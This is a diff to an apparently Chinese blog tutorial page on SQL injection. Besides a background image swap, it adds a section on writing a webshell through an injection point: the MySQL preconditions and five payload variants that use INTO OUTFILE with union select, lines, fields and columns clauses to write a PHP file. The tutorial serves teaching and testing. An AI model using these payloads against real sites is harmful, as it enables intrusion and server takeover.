@@ -155,11 +155,11 @@
     background-position: 0% 0%;
     background-repeat: no-repeat;
     background-attachment: fixed;
-    background-image: url(https://www.hqwalls.com/wp-content/uploads/2012/12/Chrome-OS-hi-res-wallpapers-32.jpg);
+    background-image: url(https://uploadstatic.mihoyo.com/contentweb/20200525/2020052518223387449.png);
   }
   @media (min-aspect-ratio: 2400/1850) {
     .wrap {
-      background-image: url(https://www.hqwalls.com/wp-content/uploads/2012/12/Chrome-OS-hi-res-wallpapers-32.jpg);
+      background-image: url(https://uploadstatic.mihoyo.com/contentweb/20200525/2020052518223387449.png);
     }
   }
   .sidebar-overlay #sidebar-checkbox:checked ~ .wrap {
@@ -350,6 +350,32 @@
       <li><a href="#%E6%8C%87%E5%AE%9A%E5%BA%93%E5%90%8D%E5%88%97%E5%87%BA%E6%89%80%E6%9C%89%E8%A1%A8">指定库名列出所有表</a></li>
       <li><a href="#%E6%8C%87%E5%AE%9A%E5%BA%93%E5%90%8D%E8%A1%A8%E5%90%8D%E5%88%97%E5%87%BA%E6%89%80%E6%9C%89%E5%AD%97%E6%AE%B5">指定库名表名列出所有字段</a></li>
       <li><a href="#%E6%8C%87%E5%AE%9A%E5%BA%93%E5%90%8D%E8%A1%A8%E5%90%8D%E5%AD%97%E6%AE%B5dump%E5%87%BA%E6%8C%87%E5%AE%9A%E5%AD%97%E6%AE%B5">指定库名表名字段dump出指定字段</a></li>
+    </ol>
+  </li>
+  <li><a href="#sql%E6%B3%A8%E5%85%A5%E5%86%99webshell">SQL注入写WebShell</a>
+    <ol>
+      <li><a href="#sql%E5%86%99webshell%E6%9D%A1%E4%BB%B6">SQL写WebShell条件</a></li>
+      <li><a href="#sql%E6%B3%A8%E5%85%A5%E7%82%B9%E5%86%99webshell%E7%9A%845%E7%A7%8D%E6%96%B9%E5%BC%8F">SQL注入点写WebShell的5种方式</a>
+        <ol>
+          <li><a href="#union-select-%E5%90%8E%E5%86%99%E5%85%A5">union select 后写入</a></li>
+          <li><a href="#lines-terminated-by-%E5%86%99%E5%85%A5">lines terminated by 写入</a>
+            <ol>
+              <li><a href="#%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86">注入原理</a></li>
+            </ol>
+          </li>
+          <li><a href="#lines-starting-by-%E5%86%99%E5%85%A5">lines starting by 写入</a>
+            <ol>
+              <li><a href="#%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86-1">注入原理</a></li>
+            </ol>
+          </li>
+          <li><a href="#fields-terminated-by-%E5%86%99%E5%85%A5">fields terminated by 写入</a></li>
+          <li><a href="#columns-terminated-by-%E5%86%99%E5%85%A5">COLUMNS terminated by 写入</a>
+            <ol>
+              <li><a href="#%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86-2">注入原理</a></li>
+            </ol>
+          </li>
+        </ol>
+      </li>
     </ol>
   </li>
 </ol>
@@ -619,11 +645,11 @@
     
     
     <i class="fas fa-file-word fa-fw"></i>
-    6551字
+    7937字
     
     
     <i class="fas fa-clock fa-fw"></i>
-    22分
+    27分
     
     
     <span class="leancloud-visitors" id="/_posts/2020-07-16-sql%E6%B3%A8%E5%85%A5/" data-xid="/_posts/2020-07-16-sql%E6%B3%A8%E5%85%A5/" data-flag-title="sql注入">
@@ -1028,6 +1054,60 @@ Options:
 <pre><code class="language-bash">sqlmap -u URL -D 数据库名称 -T 表名 -C 字段...--dump
 </code></pre>
 
+<h1 id="sql注入写webshell">SQL注入写WebShell</h1>
+
+<h2 id="sql写webshell条件">SQL写WebShell条件</h2>
+
+<ol>
+  <li>在<a href="https://www.uedbox.com/post/tag/mysql/">mysql</a>的配置文件 my.ini 中，<code>secure_file_priv="c:/wamp64/tmp"</code> 被注释 或者 ``secure_file_priv` 配置的位置是web目录。</li>
+  <li>未开启全局gpc</li>
+</ol>
+
+<h2 id="sql注入点写webshell的5种方式">SQL注入点写WebShell的5种方式</h2>
+
+<h3 id="union-select-后写入">union select 后写入</h3>
+
+<p>最常见的写入方式，union select 后跟 into outfile 语句</p>
+
+<pre><code class="language-sql">url?id=@ union select 1,2,3,4,'&lt;?php phpinfo() ?&gt;' into outfile 'path/webshell.php'
+urlid=@ union select 1,2,3,4,'&lt;?php phpinfo() ?&gt;' into dumpfile 'path/webshell.php'
+</code></pre>
+
+<h3 id="lines-terminated-by-写入">lines terminated by 写入</h3>
+
+<pre><code class="language-sql">url?id=1 into outfile 'path/webshell.php' lines terminated by '&lt;?php phpinfo() ?&gt;';
+url?id=1 limit 1 into outfile 'path/webshell.php' lines terminated by '&lt;?php phpinfo() ?&gt;';
+</code></pre>
+
+<h4 id="注入原理">注入原理</h4>
+
+<p>通过select语句查询的内容写入文件，也就是 <code>1 into outfile 'path/webshell.php'</code> 这样写的原因，然后利用 <code>lines terminated by</code> 语句拼接webshell的内容。<code>lines terminated by</code> 可以理解为 <strong>以每行终止的位置添加 xx 内容</strong>。</p>
+
+<h3 id="lines-starting-by-写入">lines starting by 写入</h3>
+
+<pre><code class="language-sql">url?id=1 into outfile 'path/webshell.php' lines starting by '&lt;?php phpinfo() ?&gt;'; 
+url?id=1 limit 1 into outfile 'path/webshell.php' lines starting by '&lt;?php phpinfo() ?&gt;';
+</code></pre>
+
+<h4 id="注入原理-1">注入原理</h4>
+
+<p>利用 <code>lines starting by</code> 语句拼接webshell的内容。<code>lines starting by</code> 可以理解为 <strong>以每行开始的位置添加 xx 内容</strong>。</p>
+
+<h3 id="fields-terminated-by-写入">fields terminated by 写入</h3>
+
+<pre><code class="language-sql">url?id=1 into outfile 'path/webshell.php' fields terminated by '&lt;?php phpinfo() ?&gt;'; 
+url?id=1 limit 1 into outfile 'path/webshell.php' fields terminated by '&lt;?php phpinfo() ?&gt;';
+</code></pre>
+
+<h3 id="columns-terminated-by-写入">COLUMNS terminated by 写入</h3>
+
+<pre><code class="language-sql">url?id=1 into outfile 'path/webshell.php' COLUMNS terminated by '&lt;?php phpinfo() ?&gt;';
+url?id=1 limit 1 into outfile 'path/webshell.php' COLUMNS terminated by '&lt;?php phpinfo() ?&gt;';
+</code></pre>
+
+<h4 id="注入原理-2">注入原理</h4>
+
+<p>利用 <code>fields terminated by</code> 语句拼接webshell的内容。<code>fields terminated by</code> 可以理解为 <strong>以每个字段的位置添加 xx 内容</strong>。</p>
 
 </div>
 <div class="v">
